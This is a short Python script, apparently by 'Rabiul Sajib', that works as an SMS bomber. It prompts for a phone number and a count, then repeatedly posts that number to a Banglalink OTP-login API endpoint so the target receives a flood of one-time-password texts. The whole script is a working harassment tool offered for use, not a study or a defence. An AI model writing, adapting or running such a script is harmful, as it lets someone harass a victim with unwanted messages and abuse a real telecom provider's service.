import requests
import pyshorteners
import colorama
from colorama import Fore, Back, Style
colorama.init()

print( Fore.GREEN + 'Hnter World ')


print("""            │
│                   ███████╗ █████╗      ██╗██╗██████╗                    │
│                   ██╔════╝██╔══██╗     ██║██║██╔══██╗                   │
│                   ███████╗███████║     ██║██║██████╔╝                   │
│                   ╚════██║██╔══██║██   ██║██║██╔══██╗                   │
│                   ███████║██║  ██║╚█████╔╝██║██████╔╝                   │
│                   ╚══════╝╚═╝  ╚═╝ ╚════╝ ╚═╝╚═════""")
print("                                 Creat By Rabiul Sajib                                       ")

#POST

myblapi="https://assetliteapi.banglalink.net/api/V1/user/otp-login/request"



number=str(input("Enter Your Number:"))

amount=int(input("Enter The Amount:"))

for i in range(amount):
    requests.post(myblapi,data=number)
    print(str(i+1)+"SMS sent") 
    
    print('\033[39m ')
